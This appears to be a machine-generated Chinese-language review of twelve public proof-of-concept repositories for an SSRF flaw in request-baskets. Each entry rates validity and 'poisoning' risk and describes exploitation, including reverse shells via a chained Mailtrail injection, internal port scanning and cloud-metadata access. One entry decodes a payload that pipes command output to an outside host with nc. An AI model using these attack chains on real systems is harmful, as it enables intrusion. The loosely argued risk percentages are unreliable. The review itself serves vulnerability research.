**利用条件:** 需要目标request-baskets服务可访问，且攻击者需要具备创建或修改basket的权限（通常需要认证，CVE描述里privilegesRequired是HIGH）。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于request-baskets v1.2.1及更早版本中，位于`/api/baskets/{name}`组件。攻击者可以通过构造恶意的API请求，利用SSRF漏洞访问内部网络资源。根据PacketstormSecurity和Github的搜索结果，该漏洞存在公开的POC。漏洞利用方式如下：

1.  **mailtrail函数 (SSRF触发):** 首先，通过`mailtrail`函数，向`/api/baskets/pwned`发送POST请求，创建一个新的basket或者修改已存在的basket。请求的body包含`forward_url`参数，该参数指向攻击者控制的服务器（在`exploit.py`中，尝试指向`http://127.0.0.1:80/`，实际攻击中需要替换为攻击者控制的服务器），并设置`proxy_response`为`True`，这导致request-baskets会将请求转发到`forward_url`，从而触发SSRF。
2.  **exploit函数 (反弹shell):** 然后，利用`exploit`函数，向`/pwned/login`（`/pwned`是之前`mailtrail`创建的basket名字）发送POST请求。POST请求的body中的`username`参数包含一段bash代码，该代码首先将一段base64编码的payload解码，然后执行。该payload是一个python反弹shell脚本，它会连接攻击者指定的IP地址和端口，并将shell重定向到该连接。`os.system`函数执行的command将payload作为参数传递给`curl`，进一步通过shell进行执行。

**有效性:** 根据github和PacketstormSecurity的搜索结果，存在公开可用的POC代码，并且`exploit.py`代码看起来也实现了该POC的逻辑。因此，该POC代码应该是有效的。

**投毒风险:** 仔细分析了`exploit.py`的代码，未发现任何明显的投毒代码。该脚本的主要功能是利用SSRF漏洞触发反弹shell，其行为与漏洞描述一致。脚本中没有额外的恶意操作，例如删除文件、窃取凭据或安装后门。用于反弹shell的python代码虽然可以用来执行任意命令，但这是漏洞利用的一部分，不能算作投毒。所有操作都围绕着利用SSRF漏洞获取shell的目的。因此，投毒风险为0%。

**项目地址:** [G4sp4rCS/htb-sau-automated](https://github.com/G4sp4rCS/htb-sau-automated)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #2

**来源**: [CVE-2023-27163-Hamibubu_CVE-2023-27163.md](../2023/CVE-2023-27163-Hamibubu_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致敏感信息泄露和内网资源访问

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets服务可访问，并且攻击者可以发送POST请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及之前版本中的一个 SSRF 漏洞。攻击者可以通过向 `/api/baskets/{name}` 发送特制的 API 请求，利用该漏洞发起服务器端请求伪造攻击。 

**有效性评估：**
根据漏洞库信息和搜索引擎结果，此漏洞的存在已得到确认，并且有公开可用的 PoC 代码。提供的 PoC 代码（CVE-2023-27163.py）看起来能够有效利用此漏洞。它允许攻击者指定一个目标 URL (`-t`) 和一个恶意 URL (`-e`)，然后创建一个新的 basket，并将其配置为将请求转发到恶意 URL。 这说明提供的POC代码有效。

**投毒风险分析：**
提供的代码主要包含以下几个文件：
*   `CVE-2023-27163.py`:  这是主要的 PoC 脚本，用于利用 SSRF 漏洞。脚本的逻辑是创建具有转发功能的 request-baskets，将流量转发到攻击者指定的 URL。
*   `README.md`:  包含脚本的使用说明。
*   `requirements.txt`:  列出了脚本所需的依赖项，只有 `requests>=2.25.1`，是一个常见的Python库。

没有发现明显的恶意代码。 但风险依然存在：

1.  **依赖风险：** `requirements.txt` 文件中声明了 `requests` 库。如果攻击者控制了上游 PyPI 仓库，并且能够投毒 `requests` 库，那么运行此脚本的用户可能会受到影响。此风险较低，因为 `requests` 是一个非常流行的库，任何投毒行为都会很快被发现。
2. **间接风险:**  虽然该POC本身没有发现恶意代码,但是使用者如果滥用此POC,比如扫描内网弱口令服务等,会造成更大的安全风险.

基于以上分析，我估计此仓库中存在作者隐藏的投毒代码的风险为 10%。主要是考虑到依赖项的潜在风险以及被滥用的可能。

**利用方式总结：**
1.  攻击者需要找到一个运行着易受攻击版本的 Request-Baskets 的服务器。
2.  攻击者使用 PoC 脚本（`CVE-2023-27163.py`）创建一个新的 basket，并设置 `forward_url` 参数为攻击者控制的恶意 URL。
3.  当有人访问新创建的 basket 时，Request-Baskets 服务器会向攻击者指定的 URL 发起请求，从而允许攻击者执行 SSRF 攻击，例如访问内部服务或泄露敏感信息。
4.  通过设置不同的 URL, 可以探测内网端口开放, 访问内网服务,甚至可以通过内网服务进行进一步的攻击。

**项目地址:** [Hamibubu/CVE-2023-27163](https://github.com/Hamibubu/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #3

**来源**: [CVE-2023-27163-HusenjanDev_CVE-2023-27163-AND-Mailtrail-v0.53.md](../2023/CVE-2023-27163-HusenjanDev_CVE-2023-27163-AND-Mailtrail-v0.53.md)

## CVE-2023-27163 - Request Baskets SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 高危，可泄露内部信息，甚至可能造成远程代码执行

**影响版本:** <= 1.2.1

**利用条件:** 目标Request Baskets服务可访问，且内部可能存在其他服务（如Mailtrail v0.53）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request Baskets 1.2.1 及之前版本中的一个 SSRF 漏洞。攻击者通过构造恶意的 API 请求到 `/api/baskets/{name}`，可以强制服务器向任意 URL 发起请求，从而访问内部网络资源。 

**漏洞利用方式：**

1.  **创建Basket并配置转发：**  利用 Request Baskets 的 API 创建一个新的 basket (例如 `pwned`)，并配置其 `forward_url` 指向内部服务 (如 `http://127.0.0.1:80/`，这里指向的是 Mailtrail)。
2.  **触发转发：**  访问创建的 basket (例如 `/pwned`)，这将导致 Request Baskets 服务器将请求转发到内部服务。
3.  **结合其他漏洞进行利用：**  如果内部服务存在其他漏洞（如Mailtrail v0.53 的远程代码执行漏洞），则可以进一步利用 SSRF 漏洞，例如通过访问 `/pwned/login` 并注入恶意payload来执行任意命令。
4.  **反弹shell：**  POC代码中，攻击者首先通过SSRF将内部Mailtrail服务暴露到`/pwned`，然后通过构造特定的URL，触发Mailtrail的RCE漏洞，从而反弹shell。

**有效性：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此POC代码**有效**。它演示了如何利用 Request Baskets 的 SSRF 漏洞，结合 Mailtrail 的漏洞，实现远程代码执行。

**投毒风险：**

POC代码相对清晰，主要逻辑是利用SSRF和RCE进行攻击。但是，`exploit.py`中直接使用`os.system(command)`执行命令存在一定风险。虽然当前command是为了反弹shell，但理论上如果`LISTENING_IP`和`LISTENING_PORT`被恶意修改，依然可以通过该命令执行其他任意操作，造成潜在的风险。

因此，判断投毒风险为10%。主要考虑是`os.system()`执行命令的潜在危险，以及代码来源的不可完全信任性。

**项目地址:** [HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53](https://github.com/HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #4

**来源**: [CVE-2023-27163-J0ey17_Exploit_CVE-2023-27163.md](../2023/CVE-2023-27163-J0ey17_Exploit_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络信息泄露

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request-Baskets服务

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及之前版本中的一个服务器端请求伪造（SSRF）漏洞。该漏洞位于`/api/baskets/{name}`组件中，允许攻击者通过构造恶意的API请求来访问网络资源和敏感信息。

**有效性评估：**

提供的PoC代码通过以下步骤利用该漏洞：

1.  **创建Basket：** PoC脚本首先创建一个具有随机名称的basket。
2.  **获取API Token：** 然后获取与该basket关联的API token，用于后续的身份验证。
3.  **配置Basket转发URL：**  使用PUT请求，将`forward_url`设置为`http://127.0.0.1:{port}/`，其中`{port}`是一个端口范围（75-81）。这会将发送到basket的所有请求转发到目标服务器（即运行Request-Baskets的服务器）上的指定端口。
4.  **发起请求：** 使用GET请求访问basket的URL，从而触发服务器端请求伪造。  如果目标端口上有服务运行，则PoC会打印该服务的响应。

此方法允许攻击者扫描目标服务器上的内部端口，并获取在这些端口上运行的服务的响应。根据漏洞描述和搜索结果中的信息，该PoC代码被认为是有效的。

**投毒风险评估：**

PoC代码本身相对简单，主要功能是利用SSRF漏洞扫描本地端口。以下几点需要注意：

*   **依赖关系：** 该脚本只依赖于requests库，这是一个常用的Python库，本身不太可能包含恶意代码。
*   **代码逻辑：** PoC的主要逻辑是发送HTTP请求，没有发现可疑的系统调用或文件操作。
*   **潜在风险：** 攻击者可能会修改`forward_url`以访问其他内部服务或执行更严重的操作，但这属于漏洞利用的范畴，而不是代码投毒。

根据对代码的分析，投毒风险较低，估计为5%。 主要风险来自于使用者如果未充分理解代码，直接运行或者修改`forward_url`参数，可能造成的非预期后果。

**利用方式：**

1.  **攻击者首先需要访问存在漏洞的Request-Baskets服务。**
2.  **攻击者构造一个包含目标内部地址（例如`127.0.0.1`或内部网络地址）的`forward_url`的PUT请求，以配置一个basket。** 这实质上是将Request-Baskets服务器配置为代理攻击者的请求。
3.  **攻击者发送一个GET请求到配置的basket URL。** Request-Baskets服务器将根据配置将此请求转发到内部地址。
4.  **如果内部地址存在服务，Request-Baskets服务器将返回该服务的响应给攻击者，从而泄露内部信息。**

通过这种方式，攻击者可以绕过防火墙和其他安全措施，访问通常无法从外部访问的内部服务，从而进行端口扫描、服务发现或获取敏感数据。

**项目地址:** [J0ey17/Exploit_CVE-2023-27163](https://github.com/J0ey17/Exploit_CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #5

**来源**: [CVE-2023-27163-KharimMchatta_basketcraft.md](../2023/CVE-2023-27163-KharimMchatta_basketcraft.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络资源访问和敏感信息泄露

**影响版本:** <= 1.2.1

**利用条件:** 目标服务器运行存在漏洞的Request-Baskets服务，且攻击者能够发送HTTP请求。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞信息和搜索结果，CVE-2023-27163是Request-Baskets 1.2.1及之前版本中存在的一个服务器端请求伪造（SSRF）漏洞，位于`/api/baskets/{name}`组件。该漏洞允许攻击者通过构造恶意的API请求来访问内部网络资源和敏感信息。

**有效性评估：**
提供的漏洞利用代码 `basketcraft.sh` 似乎是有效的，因为它旨在自动化利用该SSRF漏洞的过程。它通过提示用户输入目标URL、basket名称和攻击者IP地址，构建一个包含恶意`forward_url`的JSON payload，然后使用curl发送POST请求来创建basket。创建成功后，脚本会输出token，并使用curl再次请求创建的basket URL来触发SSRF。如果成功，Request-Baskets将会向攻击者指定的IP地址和端口发起请求，攻击者可以使用Netcat监听该端口来验证漏洞利用。

**投毒风险评估：**
代码存在轻微的投毒风险。风险点主要在于脚本依赖用户输入`attackerip`。虽然这本身不是恶意代码，但如果攻击者在不知情的情况下运行该脚本，并在`attackerip`处输入了恶意IP，那么该恶意IP可能获取目标服务器的信息。因此，存在一定的欺骗性，让用户无意间参与攻击行为。另外该脚本也存在可读性问题和缺少详细注释等。因此，投毒风险评估为10%。

**漏洞利用方式：**
1.  **创建Basket：** 攻击者使用POST请求向`/api/baskets/{name}`发送请求，其中`{name}`是basket的名称。
2.  **构造Payload：** 在POST请求的body中，攻击者会构造一个JSON payload，其中包含`forward_url`字段。`forward_url`指向攻击者想要访问的内部资源，例如`http://internal_server:8080/admin`。
3.  **触发SSRF：** 当Request-Baskets收到发送到该basket的请求时，它会将该请求转发到`forward_url`指定的地址，从而触发SSRF漏洞。
4.  **信息获取：** 如果成功，攻击者可以通过Netcat监听端口来捕获来自目标服务器的响应，或者访问原本无法访问的内部服务。

总之，该漏洞利用方式相对简单，但可能需要一些社会工程学技巧才能诱使目标用户运行包含恶意`attackerip`的脚本。

**项目地址:** [KharimMchatta/basketcraft](https://github.com/KharimMchatta/basketcraft)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #6

**来源**: [CVE-2023-27163-MasterCode112_CVE-2023-27163.md](../2023/CVE-2023-27163-MasterCode112_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能允许攻击者访问内部网络资源和敏感信息

**影响版本:** <= 1.2.1

**利用条件:** 需要目标服务器运行存在漏洞的Request-Baskets实例，且攻击者可以访问该实例。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及以前版本中存在的服务器端请求伪造 (SSRF) 漏洞。通过向 `/api/baskets/{name}` 组件发送特制的 API 请求，攻击者可以强制服务器向任意目标发起请求。根据漏洞利用代码，攻击者通过创建一个包含 `forward_url` 参数的 basket，该参数指向攻击者控制的服务器或内部网络资源。服务器会代理所有发送到该 basket 的请求到 `forward_url` 指定的地址。

**有效性：**
根据提供的漏洞信息，搜索引擎结果，以及漏洞利用代码，可以判断该漏洞是有效的，并且存在公开的POC。

**投毒风险：**
提供的脚本 `CVE-2023-27163.sh` 主要功能是创建具有转发功能的“basket”。虽然脚本本身没有明显的恶意代码，但用户在使用时需要注意以下几点：

1.  **目标服务器：**  脚本允许指定任意 `TARGET` 作为转发目标。如果攻击者控制了公共 Request-Baskets 实例，并将其转发到恶意服务器，则可能窃取用户的请求数据。
2.  **依赖外部命令：**  脚本依赖于 `curl` 和 `jq` 命令。如果这些命令被恶意替换，则可能执行恶意代码。但这种风险并非脚本本身引入，而是系统环境的风险。
3.  **创建的 Basket 长期存在：**  一旦创建了具有转发功能的 Basket，它将一直存在，除非被手动删除。如果攻击者创建了一个长期存在的恶意 Basket，可能会持续地捕获用户的请求。

由于脚本功能本身是利用漏洞进行请求转发，因此不能简单地将所有风险都归结为“投毒”。投毒风险主要来自于用户对脚本使用的环境和目标的信任程度。如果用户从不可信的来源下载脚本，或者将其应用于不可信的 Request-Baskets 实例，则存在一定的风险。此外，README.md 文件中的示例命令没有问题。

**利用方式：**
1.  攻击者使用 PoC 脚本创建一个恶意的 basket，并指定内部服务（例如，只能从本地访问的数据库管理界面）的 URL 作为 `forward_url`。
2.  当受害者（例如，管理员）访问该 basket 的 URL 时，Request-Baskets 服务器会向内部服务发起请求，并将响应返回给攻击者。
3.  通过这种方式，攻击者可以绕过防火墙或其他访问控制机制，访问内部网络资源。
4.  攻击者还可以使用该漏洞来探测内部网络，发现潜在的攻击目标。

**项目地址:** [MasterCode112/CVE-2023-27163](https://github.com/MasterCode112/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #7

**来源**: [CVE-2023-27163-Rishabh-Kumar-Cyber-Sec_CVE-2023-27163-ssrf-to-port-scanning.md](../2023/CVE-2023-27163-Rishabh-Kumar-Cyber-Sec_CVE-2023-27163-ssrf-to-port-scanning.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致信息泄露和内部网络访问

**影响版本:** <= 1.2.1

**利用条件:** 需要访问Request-Baskets服务的权限，利用需要目标服务的域名或者IP地址。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 版本及之前版本中存在的一个服务器端请求伪造（SSRF）漏洞，位于 `/api/baskets/{name}` 组件中。攻击者可以通过构造恶意 API 请求来访问内部网络资源和敏感信息。

**有效性：**
提供的 Python 脚本 `ssrf-to-port-scan.py` 利用了该漏洞，通过修改指定 Basket 的 `forward_url` 参数来触发 SSRF。脚本尝试扫描目标主机（默认为 `127.0.0.1`）的 1 到 65535 端口。如果端口关闭，则响应包含 "Failed to forward request" 字符串，脚本会打印 "Port closed"。否则，脚本会打印 "Port Open"。根据漏洞描述和脚本逻辑，可以判断该POC代码是有效的。

**投毒风险：**
审阅提供的 Python 脚本后，没有发现明显的恶意代码或后门。脚本的功能主要集中在利用 SSRF 漏洞进行端口扫描。代码行为符合预期，没有发现隐藏的、非预期的网络连接、文件操作或其他可疑行为。脚本注释中有少量需要修改的行数，以及对漏洞利用方式的简单解释，都是正常的提示信息。脚本存在明显的漏洞利用行为，但没有发现投毒代码。

**利用方式：**
1.  攻击者需要先获得对 Request-Baskets 服务的访问权限。
2.  攻击者需要创建一个 Basket 或者利用已存在的 Basket (例如，代码中使用的 `xfnq3md`)。
3.  攻击者通过 PUT 请求修改 Basket 的配置，将 `forward_url` 设置为攻击者想要访问的内部网络地址和端口。payload 可以通过json格式传递.
4.  当有用户访问该 Basket 时（例如，通过 GET 请求 `http://10.10.11.224:55555/xfnq3md`），Request-Baskets 服务会尝试将请求转发到 `forward_url` 指定的地址。
5.  如果 `forward_url` 指向内部服务，攻击者就可以通过 Request-Baskets 服务作为跳板来访问这些服务，从而实现 SSRF 攻击。

脚本使用 `proxy_response=True` 使得响应内容也会返回，因此可以判断端口是否开放。

**总结：**
该漏洞利用方式清晰，POC 代码有效，用于端口扫描。没有发现明显的投毒风险。攻击者需要能够访问 Request-Baskets 服务，并且能够操纵 Basket 的配置才能成功利用该漏洞。

**项目地址:** [Rishabh-Kumar-Cyber-Sec/CVE-2023-27163-ssrf-to-port-scanning](https://github.com/Rishabh-Kumar-Cyber-Sec/CVE-2023-27163-ssrf-to-port-scanning)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #8

**来源**: [CVE-2023-27163-Rubioo02_CVE-2023-27163.md](../2023/CVE-2023-27163-Rubioo02_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致内部网络信息泄露，甚至通过间接方式进行攻击。

**影响版本:** <= 1.2.1

**利用条件:** 需要能够访问Request-Baskets服务

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163是Request-Baskets 1.2.1及更早版本中存在的服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造特定的API请求，利用/api/baskets/{name}组件来访问内部网络资源或敏感信息。 

**利用方式：**

1.  攻击者使用提供的POC脚本，指定目标Request-Baskets服务器的URL和攻击者控制的URL。
2.  脚本会在Request-Baskets服务器上创建一个新的basket，并将`forward_url`设置为攻击者指定的URL。
3.  `proxy_response`设置为`true`，表示Request-Baskets会将从攻击者URL收到的响应返回给发起原始请求的客户端。
4.  攻击者随后向创建的basket发送请求。Request-Baskets服务器会将该请求转发到攻击者指定的URL。
5.  攻击者可以利用这一点来扫描内部网络，或访问受保护的资源。

**有效性：**

根据漏洞库信息和搜索结果，以及提供的POC代码，该漏洞是有效的。多个来源都提供了PoC，证明了漏洞的可利用性。

**投毒风险：**

提供的脚本主要功能是创建basket并设置forward_url，以实现SSRF攻击。检查了脚本内容，没有明显的恶意代码或后门，诸如反弹shell，植入挖矿程序等行为。但是，该脚本可能会被修改为包含恶意功能，因此存在一定的投毒风险，初步判断该仓库存在投毒代码的概率约为5%。使用该脚本的人员应仔细审查代码，确保其安全性。

**项目地址:** [Rubioo02/CVE-2023-27163](https://github.com/Rubioo02/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #9

**来源**: [CVE-2023-27163-ThickCoco_CVE-2023-27163-POC.md](../2023/CVE-2023-27163-ThickCoco_CVE-2023-27163-POC.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** 服务器端请求伪造 (SSRF)

**影响应用:** Request-Baskets

**危害等级:** 中危，可能导致敏感信息泄露和内部网络访问

**影响版本:** <= 1.2.1

**利用条件:** 需要目标Request-Baskets服务可访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2023-27163 是 Request-Baskets 1.2.1 及更早版本中的一个服务器端请求伪造（SSRF）漏洞。该漏洞存在于 `/api/baskets/{name}` 组件中。攻击者可以通过构造恶意的 API 请求，使服务器代表其向任意 URL 发起请求，从而访问内部网络资源或获取敏感信息。

**利用方式：**

1.  攻击者创建一个包含 `forward_url` 参数的恶意请求，该参数指向攻击者想要访问的内部或外部 URL。
2.  攻击者将此请求发送到 `/api/baskets/{name}` 端点，其中 `{name}` 是一个任意的 basket 名称。
3.  Request-Baskets 服务会向 `forward_url` 指定的 URL 发起请求，并将响应返回给攻击者。

提供的 PoC 代码 `CVE-2023-27163.py` 演示了如何利用此漏洞。它通过以下步骤工作：

1.  使用 `argparse` 处理命令行参数，包括目标 Request-Baskets 服务的 URL、目标 URL 和字典文件路径。
2. 从字典文件读取URL, 使用提供的目标 URL 和 wordlist 中的每一行来构建要fuzzing的 URL.
3.  构造一个包含 `forward_url` 的 JSON payload，并将其发送到 `/api/baskets/{name}` 端点以创建一个新的 basket。
4.  提取创建 basket 时返回的 token。
5.  再次使用该Payload进行Post请求.
6.  发送带有 token 的 GET 请求到创建的 basket，触发 SSRF。
7.  检查响应状态码。如果状态码为 200，则打印响应内容，表示攻击成功。
8.  删除创建的 basket。

**投毒风险：**

虽然代码主要功能是利用 SSRF 漏洞，但仍存在少量投毒风险。

*   **依赖管理风险：** PoC代码依赖 `requests` 库，恶意维护者可能通过植入后门版本导致攻击者受到攻击。此类风险概率较低，但后果严重，故评估为 5%。
*   **潜在的恶意 Wordlist：** PoC 使用了用户提供的 wordlist 文件。如果 wordlist 文件被篡改，包含恶意 URL，则可能导致攻击者在扫描内部网络时意外触发其他漏洞或服务，造成不必要的损害。

总体来说，该 PoC 代码的主要功能是 SSRF 利用，投毒风险较低，主要集中在依赖项和 wordlist 上。

**项目地址:** [ThickCoco/CVE-2023-27163-POC](https://github.com/ThickCoco/CVE-2023-27163-POC)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #10

**来源**: [CVE-2023-27163-btar1gan_exploit_CVE-2023-27163.md](../2023/CVE-2023-27163-btar1gan_exploit_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致敏感信息泄露，内网端口扫描，访问内部服务

**影响版本:** <= 1.2.1

**利用条件:** 需要网络访问，目标应用运行request-baskets <= 1.2.1，并允许创建和访问basket。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163是Request Baskets 1.2.1版本及以下版本中存在的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造恶意的API请求，利用`/api/baskets/{name}`组件发起对内部或外部资源的请求，从而读取敏感信息或攻击其他内部服务。

**有效性分析：**
根据搜索引擎结果和漏洞库信息，该漏洞的POC已公开。提供的POC代码看起来不像是直接攻击`/api/baskets/{name}`这个SSRF端点，而是尝试利用登录页面进行命令注入。这可能是在没有权限创建basket的情况下进行的尝试，或者该实例的配置允许登录。

**投毒风险分析：**
给定的POC代码尝试使用`echo ... | base64 -d | sh`来执行命令，这是一种常见的反弹shell的方式。username参数的值被拼接成了一个shell命令，该命令将一段base64编码的字符串解码后通过sh执行。如果攻击成功，则会在目标服务器上执行任意命令。因此，**存在投毒风险**。`echo` 和 `base64` 是Linux常见的命令，payload部分`aWR8bmMgMTkyLjE2OC40NS4yNDkgODA=`解码后是`id|nc 192.168.45.249 80`，这明显是尝试执行命令并且反弹shell。因此存在投毒风险。由于 POC 本身就是一个反弹shell的尝试，因此判定投毒概率为 10%，主要是考虑命令注入点不一定是预期点。

**利用方式：**
1.  攻击者找到存在漏洞的Request Baskets实例。
2.  攻击者利用`/api/baskets/{name}`组件，构造包含恶意URL的请求。
3.  Request Baskets服务器解析该URL并向目标服务器发起请求。
4.  攻击者可以读取目标服务器返回的内容，或者利用目标服务器的漏洞进行进一步的攻击。根据本次提供的漏洞利用代码，是尝试通过登录界面的username参数进行命令注入，来获取权限后进行利用。

**项目地址:** [btar1gan/exploit_CVE-2023-27163](https://github.com/btar1gan/exploit_CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #11

**来源**: [CVE-2023-27163-cowsecurity_CVE-2023-27163.md](../2023/CVE-2023-27163-cowsecurity_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 中危，可能导致敏感信息泄露和内网访问

**影响版本:** <= 1.2.1

**利用条件:** 需要Request Baskets服务可用，攻击者需要知道目标Request Baskets服务的URL

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2023-27163是Request Baskets 1.2.1及之前版本中的一个服务器端请求伪造（SSRF）漏洞。攻击者可以通过构造恶意的API请求，利用`/api/baskets/{name}`组件来访问内部网络资源和敏感信息。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的存在已被确认，并且有多个PoC代码可用。提供的PoC代码通过创建一个新的basket，并将`forward_url`设置为攻击者的服务器，来触发SSRF漏洞。当有人访问新创建的basket时，Request Baskets服务器将向攻击者的服务器发起请求。

**投毒风险：**

查看PoC代码，该代码主要功能是利用SSRF漏洞，没有发现明显的恶意代码或后门。`requirements.txt`文件只包含`requests`和`pyfiglet`两个常用的库，没有发现异常依赖。`README.md`文件提供的是关于漏洞的描述，安装方法和使用方法，也没有包含恶意代码。但考虑到任何代码都存在潜在风险，此处判定存在极低的投毒风险，约为1%。

**利用方式：**

1.  **部署Request Baskets:** 首先，需要部署一个存在漏洞的Request Baskets实例（版本<= 1.2.1）。
2.  **运行PoC脚本:** 运行提供的Python脚本`CVE-2023-27163.py`，指定目标Request Baskets服务的URL和攻击者的服务器URL。
3.  **创建恶意Basket:** 脚本会创建一个新的basket，并将`forward_url`设置为攻击者的服务器。
4.  **触发SSRF:** 任何访问新创建的basket的用户都会导致Request Baskets服务器向攻击者的服务器发起请求。攻击者可以在其服务器上捕获这些请求，并获取敏感信息，或者利用这些请求访问内部网络资源。

例如，攻击者可以将`attack_server`设置为内部服务的地址，例如`http://169.254.169.254/latest/meta-data`来获取云服务器的元数据。


**项目地址:** [cowsecurity/CVE-2023-27163](https://github.com/cowsecurity/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---

## POC #12

**来源**: [CVE-2023-27163-davuXVI_CVE-2023-27163.md](../2023/CVE-2023-27163-davuXVI_CVE-2023-27163.md)

## CVE-2023-27163-Request-Baskets-SSRF

**漏洞编号:** CVE-2023-27163

**漏洞类型:** SSRF (服务器端请求伪造)

**影响应用:** Request Baskets

**危害等级:** 高危，可能导致内部网络信息泄露、敏感信息访问，甚至远程代码执行。

**影响版本:** <= 1.2.1

**利用条件:** 目标服务器运行Request Baskets，并且攻击者能够发送HTTP请求到目标服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-27163 是 Request Baskets 1.2.1 及更早版本中的一个服务器端请求伪造 (SSRF) 漏洞。该漏洞存在于 `/api/baskets/{name}` 组件中。攻击者可以通过构造恶意的 API 请求，利用 `forward_url` 参数发起对内部或外部资源的请求。

**漏洞利用方式：**

1.  攻击者创建一个新的 basket，并在创建时通过 `forward_url` 指定一个恶意 URL。Request Baskets 将会尝试请求这个 URL。
2.  攻击者可以利用此漏洞读取内部服务的信息，例如元数据 API、数据库等。
3.  结合其他漏洞，例如利用Request Basket的路径遍历，在`rce_end`函数中通过python开启web服务，利用`wget`来执行攻击者服务器上的shell脚本`rev.sh`，从而实现远程代码执行。

**有效性：**

提供的PoC 代码看起来是有效的。该脚本接受目标 IP 地址、转发 IP 地址和攻击者 IP 地址作为参数。它首先创建一个带有 `forward_url` 的 basket，然后通过HTTP服务暴露反弹shell脚本，并通过request basket的路径遍历漏洞和wget命令执行反弹shell，实现RCE。

**投毒风险：**

该脚本的主要目的是利用 SSRF 漏洞实现 RCE，其中`my_script.sh`脚本在`/tmp/5d6d5c10a3b6d097d6e642a3dc9d71b8/my_script_CVE-2023-27163.sh`文件中。

*   **轻微的投毒可能:** 代码中存在使用 Python 启动 HTTP 服务器并执行 shell 命令的部分，如果攻击者的服务器被攻陷，可能会导致受害者下载并执行恶意的 shell 脚本，造成进一步的损害。或者反弹shell的ip地址被替换为恶意地址。
*   **可疑之处:**  脚本将反弹 shell 命令写入 `rev.sh` 文件，然后通过 Python 的 `http.server` 模块提供该文件。虽然这是一个利用漏洞的正常步骤，但也可能被用于传播恶意代码。

由于脚本需要用户提供攻击者的 IP 地址，并且主要目的是为了利用漏洞，因此投毒的概率相对较低，估计在 10% 左右。

**项目地址:** [davuXVI/CVE-2023-27163](https://github.com/davuXVI/CVE-2023-27163)

**漏洞详情:** [CVE-2023-27163](https://nvd.nist.gov/vuln/detail/CVE-2023-27163)

---
